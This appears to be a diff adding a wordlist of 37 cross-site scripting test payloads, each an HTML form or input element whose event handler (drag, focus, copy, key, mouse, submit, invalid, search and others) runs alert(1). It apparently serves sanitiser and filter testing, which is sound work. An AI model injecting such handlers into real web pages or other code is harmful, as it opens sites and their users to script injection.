@@ -1,0 +1,37 @@
+<form draggable="true" ondrag="alert(1)">test</form>
+<form draggable="true" ondragend="alert(1)">test</form>
+<form draggable="true" ondragenter="alert(1)">test</form>
+<form draggable="true" ondragleave="alert(1)">test</form>
+<form draggable="true" ondragstart="alert(1)">test</form>
+<form id=x tabindex=1 onactivate=alert(1)></form>
+<form id=x tabindex=1 onbeforeactivate=alert(1)></form>
+<form id=x tabindex=1 onbeforedeactivate=alert(1)></form><input autofocus>
+<form id=x tabindex=1 ondeactivate=alert(1)></form><input id=y autofocus>
+<form id=x tabindex=1 onfocus=alert(1)></form>
+<form id=x tabindex=1 onfocusin=alert(1)></form>
+<form onbeforecopy="alert(1)" contenteditable>test</form>
+<form onbeforecut="alert(1)" contenteditable>test</form>
+<form onbeforepaste="alert(1)" contenteditable>test</form>
+<form onblur=alert(1) tabindex=1 id=x></form><input autofocus>
+<form onclick="alert(1)">test</form>
+<form oncontextmenu="alert(1)">test</form>
+<form oncopy="alert(1)" contenteditable>test</form>
+<form oncut="alert(1)" contenteditable>test</form>
+<form ondblclick="alert(1)">test</form>
+<form onfocusout=alert(1) tabindex=1 id=x></form><input autofocus>
+<form onkeydown="alert(1)" contenteditable>test</form>
+<form onkeypress="alert(1)" contenteditable>test</form>
+<form onkeyup="alert(1)" contenteditable>test</form>
+<form onmousedown="alert(1)">test</form>
+<form onmouseenter="alert(1)">test</form>
+<form onmouseleave="alert(1)">test</form>
+<form onmousemove="alert(1)">test</form>
+<form onmouseout="alert(1)">test</form>
+<form onmouseover="alert(1)">test</form>
+<form onmouseup="alert(1)">test</form>
+<form onpaste="alert(1)" contenteditable>test</form>
+<form onreset=alert(1)><input type=reset>
+<form onsubmit=alert(1)><input type=submit>
+<form><input oninvalid=alert(1) required><input type=submit>
+<form><input type=search onsearch=alert(1) value="Hit return" autofocus>
+<form><textarea oninvalid=alert(1) required><input type=submit>
